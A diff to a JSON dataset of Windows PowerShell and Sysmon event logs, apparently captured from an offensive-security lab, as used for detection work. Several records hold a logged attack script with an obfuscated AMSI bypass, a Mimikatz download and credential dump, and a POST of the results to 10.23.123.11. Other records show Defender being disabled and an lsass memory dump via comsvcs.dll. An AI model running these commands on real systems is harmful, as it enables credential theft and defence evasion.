+    "computer": "win10-02.offsec.lan",
+    "timestamp": "2021-04-30T20:32:56.725489Z",
+    "event_data": {
+      "Payload": "CommandInvocation(Invoke-Expression): \"Invoke-Expression\"\r\nParameterBinding(Invoke-Expression): name=\"Command\"; value=\"[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\ntry{\n[Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'ils').GetField('am'+'siIni'+'tFailed', 'NonP'+'ublic,Sta'+'tic').SetValue($null, $true)\n}catch{}\n[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'\nIEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:443/Invoke-Mimikatz.ps1')\n$cmd = Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\n$request = [System.Net.WebRequest]::Create('https://10.23.123.11:443/')\n$request.Method = 'POST'\n$request.ContentType = 'application/x-www-form-urlencoded'\n$bytes = [System.Text.Encoding]::ASCII.GetBytes($cmd)\n$request.ContentLength = $bytes.Length\n$requestStream = $request.GetRequestStream()\n$requestStream.Write($bytes, 0, $bytes.Length)\n$requestStream.Close()\n$request.GetResponse()\"\r\nTerminatingError(Invoke-Expression): \"At line:1 char:1\r\n+ [Net.ServicePointManager]::ServerCertificateValidationCallback = {$tr ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nThis script contains malicious content and has been blocked by your antivirus software.\"\r\n"
+    }
+  },
+  "100014": {
+    "event_id": 4103,
+    "channel": "Microsoft-Windows-PowerShell/Operational",
+    "provider_name": "Microsoft-Windows-PowerShell",
+    "computer": "win10-02.offsec.lan",
+    "timestamp": "2021-04-30T20:32:56.725489Z",
+    "event_data": {
+      "Payload": "CommandInvocation(Invoke-Expression): \"Invoke-Expression\"\r\nParameterBinding(Invoke-Expression): name=\"Command\"; value=\"[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\ntry{\n[Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'ils').GetField('am'+'siIni'+'tFailed', 'NonP'+'ublic,Sta'+'tic').SetValue($null, $true)\n}catch{}\n[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'\nIEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:443/Invoke-Mimikatz.ps1')\n$cmd = Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\n$request = [System.Net.WebRequest]::Create('https://10.23.123.11:443/')\n$request.Method = 'POST'\n$request.ContentType = 'application/x-www-form-urlencoded'\n$bytes = [System.Text.Encoding]::ASCII.GetBytes($cmd)\n$request.ContentLength = $bytes.Length\n$requestStream = $request.GetRequestStream()\n$requestStream.Write($bytes, 0, $bytes.Length)\n$requestStream.Close()\n$request.GetResponse()\"\r\nTerminatingError(Invoke-Expression): \"At line:1 char:1\r\n+ [Net.ServicePointManager]::ServerCertificateValidationCallback = {$tr ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nThis script contains malicious content and has been blocked by your antivirus software.\"\r\n"
+    }
   },
   "108519": {
     "event_id": 4103,
@@ -6391,27 +6495,7 @@
       "Payload": "CommandInvocation(Invoke-Expression): \"Invoke-Expression\"\r\nParameterBinding(Invoke-Expression): name=\"Command\"; value=\"[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\ntry{\n[Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'ils').GetField('am'+'siIni'+'tFailed', 'NonP'+'ublic,Sta'+'tic').SetValue($null, $true)\n}catch{}\n[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'\nIEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:443/Invoke-Mimikatz.ps1')\n$cmd = Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\n$request = [System.Net.WebRequest]::Create('https://10.23.123.11:443/')\n$request.Method = 'POST'\n$request.ContentType = 'application/x-www-form-urlencoded'\n$bytes = [System.Text.Encoding]::ASCII.GetBytes($cmd)\n$request.ContentLength = $bytes.Length\n$requestStream = $request.GetRequestStream()\n$requestStream.Write($bytes, 0, $bytes.Length)\n$requestStream.Close()\n$request.GetResponse()\"\r\nTerminatingError(Invoke-Expression): \"At line:1 char:1\r\n+ [Net.ServicePointManager]::ServerCertificateValidationCallback = {$tr ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nThis script contains malicious content and has been blocked by your antivirus software.\"\r\n"
     }
   },
-  "100013": {
-    "event_id": 4103,
-    "channel": "Microsoft-Windows-PowerShell/Operational",
-    "provider_name": "Microsoft-Windows-PowerShell",
-    "computer": "win10-02.offsec.lan",
-    "timestamp": "2021-04-30T20:32:56.725489Z",
-    "event_data": {
-      "Payload": "CommandInvocation(Invoke-Expression): \"Invoke-Expression\"\r\nParameterBinding(Invoke-Expression): name=\"Command\"; value=\"[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\ntry{\n[Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'ils').GetField('am'+'siIni'+'tFailed', 'NonP'+'ublic,Sta'+'tic').SetValue($null, $true)\n}catch{}\n[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'\nIEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:443/Invoke-Mimikatz.ps1')\n$cmd = Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\n$request = [System.Net.WebRequest]::Create('https://10.23.123.11:443/')\n$request.Method = 'POST'\n$request.ContentType = 'application/x-www-form-urlencoded'\n$bytes = [System.Text.Encoding]::ASCII.GetBytes($cmd)\n$request.ContentLength = $bytes.Length\n$requestStream = $request.GetRequestStream()\n$requestStream.Write($bytes, 0, $bytes.Length)\n$requestStream.Close()\n$request.GetResponse()\"\r\nTerminatingError(Invoke-Expression): \"At line:1 char:1\r\n+ [Net.ServicePointManager]::ServerCertificateValidationCallback = {$tr ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nThis script contains malicious content and has been blocked by your antivirus software.\"\r\n"
-    }
-  },
-  "108520": {
-    "event_id": 4103,
-    "channel": "Microsoft-Windows-PowerShell/Operational",
-    "provider_name": "Microsoft-Windows-PowerShell",
-    "computer": "win10-02.offsec.lan",
-    "timestamp": "2021-04-30T20:32:56.725489Z",
-    "event_data": {
-      "Payload": "CommandInvocation(Invoke-Expression): \"Invoke-Expression\"\r\nParameterBinding(Invoke-Expression): name=\"Command\"; value=\"[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\ntry{\n[Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'ils').GetField('am'+'siIni'+'tFailed', 'NonP'+'ublic,Sta'+'tic').SetValue($null, $true)\n}catch{}\n[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'\nIEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:443/Invoke-Mimikatz.ps1')\n$cmd = Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\n$request = [System.Net.WebRequest]::Create('https://10.23.123.11:443/')\n$request.Method = 'POST'\n$request.ContentType = 'application/x-www-form-urlencoded'\n$bytes = [System.Text.Encoding]::ASCII.GetBytes($cmd)\n$request.ContentLength = $bytes.Length\n$requestStream = $request.GetRequestStream()\n$requestStream.Write($bytes, 0, $bytes.Length)\n$requestStream.Close()\n$request.GetResponse()\"\r\nTerminatingError(Invoke-Expression): \"At line:1 char:1\r\n+ [Net.ServicePointManager]::ServerCertificateValidationCallback = {$tr ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nThis script contains malicious content and has been blocked by your antivirus software.\"\r\n"
-    }
-  },
-  "112031": {
+  "112038": {
     "event_id": 4104,
     "channel": "Microsoft-Windows-PowerShell/Operational",
     "provider_name": "Microsoft-Windows-PowerShell",
@@ -6421,7 +6505,7 @@
       "ScriptBlockText": "Set-MpPreference -DisableRealtimeMonitoring $true"
     }
   },
-  "100014": {
+  "100015": {
     "event_id": 4104,
     "channel": "Microsoft-Windows-PowerShell/Operational",
     "provider_name": "Microsoft-Windows-PowerShell",
@@ -6431,7 +6515,7 @@
       "ScriptBlockText": "\r\n#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'root/standardcimv2/MSFT_NetConSecRule'\r\n$script:ClassVersion = '1.0.0'\r\n$script:ModuleVersion = '1.0.0.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction New-NetIPsecRule\r\n{\r\n    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]\r\n    \r\n    \r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [string]\r\n    ${PolicyStore},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [string]\r\n    ${GPOSession},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0', ValueFromPipelineByPropertyName=$true)]\r\n    [Alias('ID','Name')]\r\n    [string]\r\n    ${IPsecRuleName},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0', Mandatory=$true)]\r\n    [string]\r\n    ${DisplayName},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [string]\r\n    ${Description},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [string]\r\n    ${Group},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled]\r\n    ${Enabled},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile]\r\n    ${Profile},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [string[]]\r\n    ${Platform},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.IPsecMode]\r\n    ${Mode},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [Alias('SecIn')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy]\r\n    ${InboundSecurity},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [Alias('SecOut')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy]\r\n    ${OutboundSecurity},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [string]\r\n    ${QuickModeCryptoSet},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [string]\r\n    ${Phase1AuthSet},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [string]\r\n    ${Phase2AuthSet},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.KeyModule]\r\n    ${KeyModule},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [bool]\r\n    ${AllowWatchKey},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [bool]\r\n    ${AllowSetKey},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [string[]]\r\n    ${LocalTunnelEndpoint},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [string[]]\r\n    ${RemoteTunnelEndpoint},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [string]\r\n    ${RemoteTunnelHostname},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [uint32]\r\n    ${ForwardPathLifetime},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [bool]\r\n    ${EncryptedTunnelBypass},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [bool]\r\n    ${RequireAuthorization},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [string]\r\n    ${User},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [string]\r\n    ${Machine},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [string[]]\r\n    ${LocalAddress},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [string[]]\r\n    ${RemoteAddress},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [string]\r\n    ${Protocol},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [string[]]\r\n    ${LocalPort},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [string[]]\r\n    ${RemotePort},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [WildcardPattern[]]\r\n    ${InterfaceAlias},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.InterfaceType]\r\n    ${InterfaceType},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('PolicyStore')) {\r\n          [object]$__cmdletization_value = ${PolicyStore}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('GPOSession')) {\r\n          [object]$__cmdletization_value = ${GPOSession}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('IPsecRuleName')) {\r\n          [object]$__cmdletization_value = ${IPsecRuleName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InstanceID'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InstanceID'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisplayName')) {\r\n          [object]$__cmdletization_value = ${DisplayName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Description')) {\r\n          [object]$__cmdletization_value = ${Description}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Group')) {\r\n          [object]$__cmdletization_value = ${Group}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RuleGroup'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RuleGroup'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.Contains"
     }
   },
-  "108521": {
+  "108520": {
     "event_id": 1,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -6441,7 +6525,7 @@
       "Image": "C:\\TOOLS\\Mimikatzx64\\mimikatz.exe"
     }
   },
-  "108522": {
+  "108521": {
     "event_id": 4104,
     "channel": "Microsoft-Windows-PowerShell/Operational",
     "provider_name": "Microsoft-Windows-PowerShell",
@@ -6451,7 +6535,7 @@
       "ScriptBlockText": "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id"
     }
   },
-  "100015": {
+  "100016": {
     "event_id": 4104,
     "channel": "Microsoft-Windows-PowerShell/Operational",
     "provider_name": "Microsoft-Windows-PowerShell",
@@ -6471,16 +6555,6 @@
       "ScriptBlockText": "@{\r\nGUID=\"EEFCB906-B326-4E99-9F54-8B4BB6EF3C6D\"\r\nAuthor=\"Microsoft Corporation\"\r\nCompanyName=\"Microsoft Corporation\"\r\nCopyright=\"\u00a9 Microsoft Corporation. All rights reserved.\"\r\nModuleVersion=\"3.1.0.0\"\r\nPowerShellVersion=\"3.0\"\r\nCLRVersion=\"4.0\"\r\nNestedModules=\"Microsoft.PowerShell.Commands.Management.dll\"\r\nHelpInfoURI = 'http://go.microsoft.com/fwlink/?linkid=285756'\r\nCmdletsToExport=@(\"Add-Content\",\r\n    \"Clear-Content\",\r\n    \"Clear-ItemProperty\",\r\n    \"Join-Path\",\r\n    \"Convert-Path\",\r\n    \"Copy-ItemProperty\",\r\n    \"Get-EventLog\",\r\n    \"Clear-EventLog\",\r\n    \"Write-EventLog\",\r\n    \"Limit-EventLog\",\r\n    \"Show-EventLog\",\r\n    \"New-EventLog\",\r\n    \"Remove-EventLog\",\r\n    \"Get-ChildItem\",\r\n    \"Get-Content\",\r\n    \"Get-ItemProperty\",\r\n    \"Get-WmiObject\",\r\n    \"Invoke-WmiMethod\",\r\n    \"Move-ItemProperty\",\r\n    \"Get-Location\",\r\n    \"Set-Location\",\r\n    \"Push-Location\",\r\n    \"Pop-Location\",\r\n    \"New-PSDrive\",\r\n    \"Remove-PSDrive\",\r\n    \"Get-PSDrive\",\r\n    \"Get-Item\",\r\n    \"New-Item\",\r\n    \"Set-Item\",\r\n    \"Remove-Item\",\r\n    \"Move-Item\",\r\n    \"Rename-Item\",\r\n    \"Copy-Item\",\r\n    \"Clear-Item\",\r\n    \"Invoke-Item\",\r\n    \"Get-PSProvider\",\r\n    \"New-ItemProperty\",\r\n    \"Split-Path\",\r\n    \"Test-Path\",\r\n    \"Get-Process\",\r\n    \"Stop-Process\",\r\n    \"Wait-Process\",\r\n    \"Debug-Process\",\r\n    \"Start-Process\",\r\n    \"Remove-ItemProperty\",\r\n    \"Remove-WmiObject\",\r\n    \"Rename-ItemProperty\",\r\n    \"Register-WmiEvent\",\r\n    \"Resolve-Path\",\r\n    \"Get-Service\",\r\n    \"Stop-Service\",\r\n    \"Start-Service\",\r\n    \"Suspend-Service\",\r\n    \"Resume-Service\",\r\n    \"Restart-Service\",\r\n    \"Set-Service\",\r\n    \"New-Service\",\r\n    \"Set-Content\",\r\n    \"Set-ItemProperty\",\r\n    \"Set-WmiInstance\",\r\n    \"Get-Transaction\",\r\n    \"Start-Transaction\",\r\n    \"Complete-Transaction\",\r\n    \"Undo-Transaction\",\r\n    \"Use-Transaction\",\r\n    \"New-WebServiceProxy\",\r\n    \"Get-HotFix\",\r\n    \"Test-Connection\",\r\n    \"Enable-ComputerRestore\",\r\n    \"Disable-ComputerRestore\",\r\n    \"Checkpoint-Computer\",\r\n    \"Get-ComputerRestorePoint\",\r\n    \"Restart-Computer\",\r\n    \"Stop-Computer\",\r\n    \"Restore-Computer\",\r\n    \"Add-Computer\",\r\n    \"Remove-Computer\",\r\n    \"Test-ComputerSecureChannel\",\r\n    \"Reset-ComputerMachinePassword\",\r\n    \"Rename-Computer\",\r\n    \"Get-ControlPanelItem\",\r\n    \"Show-ControlPanelItem\")\r\n}\r\n"
     }
   },
-  "100016": {
-    "event_id": 4104,
-    "channel": "Microsoft-Windows-PowerShell/Operational",
-    "provider_name": "Microsoft-Windows-PowerShell",
-    "computer": "FS03.offsec.lan",
-    "timestamp": "2021-10-25T07:23:05.614172Z",
-    "event_data": {
-      "ScriptBlockText": "@{\r\nGUID=\"1DA87E53-152B-403E-98DC-74D7B4D63D59\"\r\nAuthor=\"Microsoft Corporation\"\r\nCompanyName=\"Microsoft Corporation\"\r\nCopyright=\"\u00a9 Microsoft Corporation. All rights reserved.\"\r\nModuleVersion=\"3.1.0.0\"\r\nPowerShellVersion=\"3.0\"\r\nCLRVersion=\"4.0\"\r\nCmdletsToExport= \"Format-List\", \"Format-Custom\", \"Format-Table\", \"Format-Wide\",\r\n    \"Out-File\", \"Out-Printer\", \"Out-String\",\r\n    \"Out-GridView\", \"Get-FormatData\", \"Export-FormatData\", \"ConvertFrom-Json\", \"ConvertTo-Json\",\r\n    \"Invoke-RestMethod\", \"Invoke-WebRequest\", \"Register-ObjectEvent\", \"Register-EngineEvent\",\r\n    \"Wait-Event\", \"Get-Event\", \"Remove-Event\", \"Get-EventSubscriber\", \"Unregister-Event\",\r\n    \"New-Event\", \"Add-Member\", \"Add-Type\", \"Compare-Object\", \"ConvertTo-Html\", \"ConvertFrom-StringData\",\r\n    \"Export-Csv\", \"Import-Csv\", \"ConvertTo-Csv\", \"ConvertFrom-Csv\", \"Export-Alias\", \"Invoke-Expression\",\r\n    \"Get-Alias\", \"Get-Culture\", \"Get-Date\", \"Get-Host\", \"Get-Member\", \"Get-Random\", \"Get-UICulture\",\r\n    \"Get-FileHash\", \"Get-Unique\", \"Export-PSSession\", \"Import-PSSession\", \"Import-Alias\", \"Import-LocalizedData\",\r\n    \"Select-String\", \"Measure-Object\", \"New-Alias\", \"New-TimeSpan\", \"Read-Host\", \"Set-Alias\", \"Set-Date\",\r\n    \"Start-Sleep\", \"Tee-Object\", \"Measure-Command\", \"Update-List\", \"Update-TypeData\", \"Update-FormatData\",\r\n    \"Remove-TypeData\", \"Get-TypeData\", \"Write-Host\", \"Write-Progress\", \"New-Object\", \"Select-Object\",\r\n    \"Group-Object\", \"Sort-Object\", \"Get-Variable\", \"New-Variable\", \"Set-Variable\", \"Remove-Variable\",\r\n    \"Clear-Variable\", \"Export-Clixml\", \"Import-Clixml\", \"ConvertTo-Xml\", \"Select-Xml\", \"Write-Debug\",\r\n    \"Write-Verbose\", \"Write-Warning\", \"Write-Error\", \"Write-Output\", \"Set-PSBreakpoint\", \"Get-PSBreakpoint\",\r\n    \"Remove-PSBreakpoint\", \"Enable-PSBreakpoint\", \"Disable-PSBreakpoint\", \"Get-PSCallStack\",\r\n    \"Send-MailMessage\", \"Get-TraceSource\", \"Set-TraceSource\", \"Trace-Command\", \"Show-Command\", \"Unblock-File\"\r\nNestedModules=\"Microsoft.PowerShell.Commands.Utility.dll\",\"Microsoft.PowerShell.Utility.psm1\"\r\nHelpInfoURI = 'http://go.microsoft.com/fwlink/?linkid=285758'\r\n}\r\n"
-    }
-  },
   "100017": {
     "event_id": 4104,
     "channel": "Microsoft-Windows-PowerShell/Operational",
@@ -6491,7 +6565,17 @@
